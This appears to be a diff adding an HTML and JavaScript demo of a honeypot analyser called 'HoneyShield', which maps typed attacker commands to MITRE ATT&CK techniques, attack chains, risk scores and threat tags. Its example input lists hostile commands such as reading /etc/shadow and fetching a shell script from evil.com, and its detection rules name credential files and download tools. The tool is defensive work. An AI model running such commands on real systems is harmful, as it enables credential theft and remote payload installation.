@@ -1,0 +1,398 @@
+cat > index.html << 'EOF'
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>HoneyShield — Online Demo</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:'Segoe UI',system-ui,sans-serif; background:#0d1117; color:#e6edf3; }
+
+header { background:linear-gradient(135deg,#161b22 0%,#1c2128 100%); padding:20px 28px; border-bottom:1px solid #30363d; }
+header h1 { font-size:24px; color:#58a6ff; margin-bottom:4px; }
+header p { font-size:13px; color:#8b949e; }
+
+.container { max-width:1400px; margin:0 auto; padding:20px 28px; }
+
+.two-column { display:grid; grid-template-columns:1fr 1fr; gap:20px; margin-bottom:20px; }
+@media (max-width:1024px) { .two-column { grid-template-columns:1fr; } }
+
+.card { background:#161b22; border:1px solid #30363d; border-radius:10px; padding:20px; }
+.card h2 { font-size:14px; color:#8b949e; text-transform:uppercase; margin-bottom:12px; }
+.card h3 { font-size:16px; color:#f0f6fc; margin-bottom:8px; }
+
+textarea { width:100%; height:180px; background:#0d1117; color:#79c0ff; border:1px solid #30363d; border-radius:6px; padding:12px; font-family:monospace; font-size:13px; resize:vertical; }
+button { background:#238636; color:#fff; border:none; padding:10px 20px; border-radius:6px; cursor:pointer; font-weight:600; margin-top:10px; }
+button:hover { background:#26a641; }
+
+.stat-grid { display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:16px; }
+.stat { background:#0d1117; border:1px solid #30363d; border-radius:6px; padding:12px; text-align:center; }
+.stat-num { font-size:28px; font-weight:700; color:#58a6ff; }
+.stat-label { font-size:11px; color:#8b949e; margin-top:4px; }
+
+.badge { display:inline-block; padding:3px 10px; border-radius:12px; font-size:11px; font-weight:600; margin:2px; }
+.badge-danger { background:#da3633; color:#fff; }
+.badge-warning { background:#9e6a03; color:#f0e68c; }
+.badge-info { background:#1f6feb; color:#fff; }
+.badge-success { background:#238636; color:#fff; }
+
+.mitre-card { background:#0d419d; color:#a5d6ff; border:1px solid #1f6feb; border-radius:6px; padding:8px 12px; font-size:11px; margin:2px; display:inline-block; }
+.threat-tag { background:#2d1117; color:#ff7b7b; border:1px solid #da3633; border-radius:4px; padding:4px 8px; font-size:11px; margin:2px; display:inline-block; }
+
+.timeline { max-height:150px; overflow-y:auto; }
+.tl-row { display:flex; gap:8px; padding:3px 0; font-size:11px; }
+.tl-time { color:#8b949e; font-family:monospace; min-width:60px; }
+.tl-event { color:#e6edf3; }
+
+#map { height:350px; border-radius:8px; border:1px solid #30363d; margin-top:10px; }
+
+.result-section { margin-top:20px; padding-top:20px; border-top:1px solid #21262d; }
+footer { text-align:center; padding:20px 28px; color:#484f58; font-size:12px; border-top:1px solid #21262d; margin-top:40px; }
+</style>
+</head>
+<body>
+
+<header>
+<h1>🍯 HoneyShield — Online Interactive Demo</h1>
+<p>Type attacker commands below and see real-time intelligence analysis</p>
+</header>
+
+<div class="container">
+
+<div class="two-column">
+<!-- INPUT SECTION -->
+<div class="card">
+<h2>Input — Attacker Commands</h2>
+<p style="font-size:12px; color:#8b949e; margin-bottom:10px;">
+Type the commands an attacker would run (one per line). Example:<br/>
+<code style="color:#79c0ff;">id</code><br/>
+<code style="color:#79c0ff;">cat /etc/shadow</code><br/>
+<code style="color:#79c0ff;">wget http://evil.com/shell.sh</code>
+</p>
+<textarea id="commands" placeholder="id&#10;whoami&#10;cat /etc/passwd&#10;cat /etc/shadow&#10;wget http://malware.com/shell.sh&#10;chmod +x shell.sh&#10;crontab -l"></textarea>
+<button onclick="analyzeSession()">🔍 Analyze Attack</button>
+<button onclick="resetDemo()" style="background:#444; margin-left:8px;">Reset</button>
+</div>
+
+<!-- STATS SECTION -->
+<div class="card">
+<h2>📊 Attack Statistics</h2>
+<div class="stat-grid">
+<div class="stat">
+<div class="stat-num" id="stat-cmds">0</div>
+<div class="stat-label">Commands</div>
+</div>
+<div class="stat">
+<div class="stat-num" id="stat-risk">—</div>
+<div class="stat-label">Risk Level</div>
+</div>
+<div class="stat">
+<div class="stat-num" id="stat-mitre">0</div>
+<div class="stat-label">MITRE TTPs</div>
+</div>
+<div class="stat">
+<div class="stat-num" id="stat-tags">0</div>
+<div class="stat-label">Threat Tags</div>
+</div>
+</div>
+
+<h3 style="margin-top:16px; color:#f0f6fc;">Risk Score</h3>
+<div id="risk-display" style="font-size:18px; font-weight:700; margin-top:8px;">—</div>
+<div id="risk-reasons" style="font-size:11px; color:#8b949e; margin-top:8px;"></div>
+
+<h3 style="margin-top:16px; color:#f0f6fc;">Attacker Profile</h3>
+<div id="profile-display" style="margin-top:8px;"></div>
+</div>
+</div>
+
+<!-- RESULT SECTIONS -->
+<div class="result-section">
+<h2 style="margin-bottom:16px;">🎯 Attack Chain Detection</h2>
+<div id="chain-result" style="background:#0d419d; border:1px solid #1f6feb; border-radius:8px; padding:16px; color:#79c0ff;">
+Select commands and click "Analyze Attack" to see detected chain
+</div>
+</div>
+
+<div class="result-section">
+<h2 style="margin-bottom:16px;">🛡️ MITRE ATT&CK Techniques Mapped</h2>
+<div id="mitre-result" style="padding:12px; background:#0d1117; border:1px solid #30363d; border-radius:8px;">
+<div id="mitre-tags" style="color:#8b949e; font-size:12px;">No commands analyzed yet</div>
+</div>
+</div>
+
+<div class="result-section">
+<h2 style="margin-bottom:16px;">⚠️ Threat Intent Tags</h2>
+<div id="threat-result" style="padding:12px; background:#0d1117; border:1px solid #30363d; border-radius:8px;">
+<div id="threat-tags" style="color:#8b949e; font-size:12px;">No threats detected</div>
+</div>
+</div>
+
+<div class="result-section">
+<h2 style="margin-bottom:16px;">📋 Session Timeline</h2>
+<div class="timeline" id="timeline-result" style="background:#0d1117; border:1px solid #30363d; border-radius:8px; padding:10px;">
+<div style="color:#8b949e; font-size:12px;">Timeline will appear here</div>
+</div>
+</div>
+
+</div>
+
+<footer>
+HoneyShield Demo • Runs entirely in your browser • No data is sent to any server<br/>
+<a href="https://github.com/YOUR-USERNAME/honeypot-demo" style="color:#58a6ff; text-decoration:none;">View on GitHub</a>
+</footer>
+
+</body>
+
+<script>
+// MITRE MAPPING DATABASE
+const MITRE_DB = {
+  "whoami":          {id:"T1033", name:"System Owner Discovery", tactic:"Discovery"},
+  "id":              {id:"T1033", name:"System Owner Discovery", tactic:"Discovery"},
+  "uname":           {id:"T1082", name:"System Information Discovery", tactic:"Discovery"},
+  "cat /etc/passwd": {id:"T1087", name:"Account Discovery", tactic:"Discovery"},
+  "cat /etc/shadow": {id:"T1003", name:"OS Credential Dumping", tactic:"Credential Access"},
+  "ls":              {id:"T1083", name:"File and Directory Discovery", tactic:"Discovery"},
+  "pwd":             {id:"T1083", name:"File and Directory Discovery", tactic:"Discovery"},
+  "ps":              {id:"T1057", name:"Process Discovery", tactic:"Discovery"},
+  "netstat":         {id:"T1049", name:"System Network Connections Discovery", tactic:"Discovery"},
+  "ifconfig":        {id:"T1016", name:"System Network Configuration Discovery", tactic:"Discovery"},
+  "wget":            {id:"T1105", name:"Ingress Tool Transfer", tactic:"Command and Control"},
+  "curl":            {id:"T1105", name:"Ingress Tool Transfer", tactic:"Command and Control"},
+  "chmod":           {id:"T1222", name:"File Permission Modification", tactic:"Defense Evasion"},
+  "sudo":            {id:"T1548", name:"Abuse Elevation Control Mechanism", tactic:"Privilege Escalation"},
+  "passwd":          {id:"T1098", name:"Account Manipulation", tactic:"Persistence"},
+  "crontab":         {id:"T1053", name:"Scheduled Task/Job", tactic:"Persistence"},
+  "bash":            {id:"T1059", name:"Command and Scripting Interpreter", tactic:"Execution"},
+  "ssh":             {id:"T1021", name:"Remote Services", tactic:"Lateral Movement"},
+  "history":         {id:"T1552", name:"Unsecured Credentials", tactic:"Credential Access"},
+  "authorized_keys": {id:"T1098", name:"Account Manipulation", tactic:"Persistence"},
+  "iptables":        {id:"T1562", name:"Impair Defenses", tactic:"Defense Evasion"},
+  "useradd":         {id:"T1136", name:"Create Account", tactic:"Persistence"},
+};
+
+// ATTACK CHAIN PATTERNS
+const CHAINS = [
+  {
+    name: "Full Compromise Chain",
+    severity: "CRITICAL",
+    sequence: ["Discovery", "Credential Access", "Persistence"],
+    desc: "Attacker performed recon → stole credentials → planted backdoor"
+  },
+  {
+    name: "Malware Deployment Chain",
+    severity: "CRITICAL",
+    sequence: ["Discovery", "Command and Control", "Execution"],
+    desc: "Attacker enumerated system → downloaded payload → executed"
+  },
+  {
+    name: "Credential Harvesting Chain",
+    severity: "HIGH",
+    sequence: ["Discovery", "Credential Access"],
+    desc: "Attacker performed recon → attempted credential theft"
+  },
+  {
+    name: "Reconnaissance Only",
+    severity: "LOW",
+    sequence: ["Discovery"],
+    desc: "Basic system enumeration only"
+  }
+];
+
+// THREAT TAGS
+const THREAT_RULES = [
+  {tag:"💣 Malware Dropper Detected", severity:"CRITICAL", keywords:["wget", "curl", ".sh", ".py", ".elf"]},
+  {tag:"🔑 Credential Harvesting", severity:"HIGH", keywords:["shadow", "passwd", "history", ".ssh"]},
+  {tag:"🔒 Persistence Mechanism", severity:"HIGH", keywords:["crontab", "useradd", "authorized_keys", "rc.local"]},
+  {tag:"🛡️ Defense Evasion", severity:"HIGH", keywords:["iptables", "chmod", "shred", "history"]},
+  {tag:"⚡ Privilege Escalation", severity:"HIGH", keywords:["sudo", "chmod +s", "find -perm"]},
+];
+
+function mapCommandToMitre(cmd) {
+  cmd = cmd.toLowerCase().trim();
+  let results = [];
+  let seen = new Set();
+  for (let [keyword, tech] of Object.entries(MITRE_DB)) {
+    if (cmd.includes(keyword) && !seen.has(tech.id)) {
+      results.push(tech);
+      seen.add(tech.id);
+    }
+  }
+  if (results.length === 0) {
+    results.push({id:"T1059", name:"Command and Scripting Interpreter", tactic:"Execution"});
+  }
+  return results;
+}
+
+function getTacticSequence(commands) {
+  let sequence = [];
+  for (let cmd of commands) {
+    let techs = mapCommandToMitre(cmd);
+    for (let t of techs) {
+      if (!sequence.includes(t.tactic)) {
+        sequence.push(t.tactic);
+      }
+    }
+  }
+  return sequence;
+}
+
+function detectChain(commands) {
+  let seq = getTacticSequence(commands);
+  let cmdStr = commands.join(" ").toLowerCase();
+
+  for (let chain of CHAINS) {
+    let found = true;
+    let idx = 0;
+    for (let tac of chain.sequence) {
+      let foundTac = false;
+      for (let i = idx; i < seq.length; i++) {
+        if (seq[i] === tac) {
+          idx = i + 1;
+          foundTac = true;
+          break;
+        }
+      }
+      if (!foundTac) { found = false; break; }
+    }
+    if (found) return chain;
+  }
+  return {name:"Unknown Pattern", severity:"MEDIUM", sequence:seq, desc:"Unusual command sequence"};
+}
+
+function generateTags(commands) {
+  let cmdStr = commands.join(" ").toLowerCase();
+  let tags = [];
+  for (let rule of THREAT_RULES) {
+    if (rule.keywords.some(kw => cmdStr.includes(kw))) {
+      tags.push(rule.tag);
+    }
+  }
+  return tags;
+}
+
+function classifyAttacker(commands) {
+  let cmdStr = commands.join(" ").toLowerCase();
+  let targetedScore = ["shadow", "authorized_keys", "crontab", "useradd"].filter(k => cmdStr.includes(k)).length;
+  let scriptScore = ["id", "whoami", "uname", "ls", "cat", "pwd"].filter(k => cmdStr.includes(k)).length;
+
+  if (targetedScore >= 2) return {type:"Targeted Attacker", conf:"High", badge:"warning"};
+  if (scriptScore >= 2) return {type:"Script Kiddie", conf:"Medium", badge:"info"};
+  return {type:"Curious User", conf:"Low", badge:"success"};
+}
+
+function calculateRisk(commands) {
+  let score = 0;
+  let reasons = [];
+  let cmdStr = commands.join(" ").toLowerCase();
+
+  if (["shadow", "authorized_keys", "crontab"].some(k => cmdStr.includes(k))) {
+    score += 8; reasons.push("Credential/Persistence commands (+8)");
+  }
+  if (["wget", "curl"].some(k => cmdStr.includes(k))) {
+    score += 5; reasons.push("Tool download attempt (+5)");
+  }
+  if (["chmod", "iptables"].some(k => cmdStr.includes(k))) {
+    score += 3; reasons.push("Defense evasion (+3)");
+  }
+  score += Math.min(commands.length * 0.5, 3);
+
+  let level, color;
+  if (score >= 12) { level = "CRITICAL"; color = "#da3633"; }
+  else if (score >= 8) { level = "HIGH"; color = "#e3b341"; }
+  else if (score >= 4) { level = "MEDIUM"; color = "#58a6ff"; }
+  else { level = "LOW"; color = "#3fb950"; }
+
+  return {score: Math.round(score), level, color, reasons};
+}
+
+function analyzeSession() {
+  let input = document.getElementById("commands").value.trim();
+  if (!input) { alert("Enter some commands!"); return; }
+
+  let commands = input.split('\n').map(c => c.trim()).filter(c => c);
+
+  // Calculate all metrics
+  let risk = calculateRisk(commands);
+  let profile = classifyAttacker(commands);
+  let chain = detectChain(commands);
+  let tags = generateTags(commands);
+
+  // Collect all MITRE techniques
+  let allMitre = new Set();
+  let mitreList = [];
+  for (let cmd of commands) {
+    let techs = mapCommandToMitre(cmd);
+    for (let t of techs) {
+      if (!allMitre.has(t.id)) {
+        allMitre.add(t.id);
+        mitreList.push(t);
+      }
+    }
+  }
+
+  // Update stats
+  document.getElementById("stat-cmds").textContent = commands.length;
+  document.getElementById("stat-risk").textContent = risk.level[0];
+  document.getElementById("stat-mitre").textContent = mitreList.length;
+  document.getElementById("stat-tags").textContent = tags.length;
+
+  // Update risk display
+  document.getElementById("risk-display").innerHTML = `<span style="color:${risk.color}">${risk.level} (Score: ${risk.score})</span>`;
+  document.getElementById("risk-reasons").innerHTML = risk.reasons.map(r => `• ${r}`).join('<br/>');
+
+  // Update profile
+  document.getElementById("profile-display").innerHTML = `
+    <span class="badge badge-${profile.badge}">${profile.type}</span>
+    <div style="font-size:11px; color:#8b949e; margin-top:4px;">${profile.conf} confidence</div>
+  `;
+
+  // Update chain
+  document.getElementById("chain-result").innerHTML = `
+    <div style="color:#${chain.severity==='CRITICAL'?'da3633':chain.severity==='HIGH'?'e3b341':'58a6ff'}; font-weight:700; margin-bottom:8px;">
+      ${chain.name}
+    </div>
+    <div style="color:#8b949e; font-size:12px;">${chain.desc}</div>
+  `;
+
+  // Update MITRE
+  document.getElementById("mitre-tags").innerHTML = mitreList.map(t => 
+    `<div class="mitre-card" title="${t.name}">${t.id}</div>`
+  ).join('') || '<div style="color:#8b949e;">No techniques mapped</div>';
+
+  // Update threats
+  document.getElementById("threat-tags").innerHTML = tags.map(t => 
+    `<div class="threat-tag">${t}</div>`
+  ).join('') || '<div style="color:#8b949e;">No threats detected</div>';
+
+  // Update timeline
+  let timeline = commands.map((cmd, i) => `
+    <div class="tl-row">
+      <span class="tl-time">[00:0${i}]</span>
+      <span class="tl-event">$ ${cmd}</span>
+    </div>
+  `).join('');
+  document.getElementById("timeline-result").innerHTML = timeline;
+}
+
+function resetDemo() {
+  document.getElementById("commands").value = "";
+  document.getElementById("stat-cmds").textContent = "0";
+  document.getElementById("stat-risk").textContent = "—";
+  document.getElementById("stat-mitre").textContent = "0";
+  document.getElementById("stat-tags").textContent = "0";
+  document.getElementById("risk-display").textContent = "—";
+  document.getElementById("risk-reasons").innerHTML = "";
+  document.getElementById("profile-display").innerHTML = "";
+  document.getElementById("chain-result").textContent = "Select commands and click 'Analyze Attack' to see detected chain";
+  document.getElementById("mitre-tags").textContent = "No commands analyzed yet";
+  document.getElementById("threat-tags").textContent = "No threats detected";
+  document.getElementById("timeline-result").innerHTML = '<div style="color:#8b949e; font-size:12px;">Timeline will appear here</div>';
+}
+</script>
+</body>
+</html>
+EOF
+cat index.html
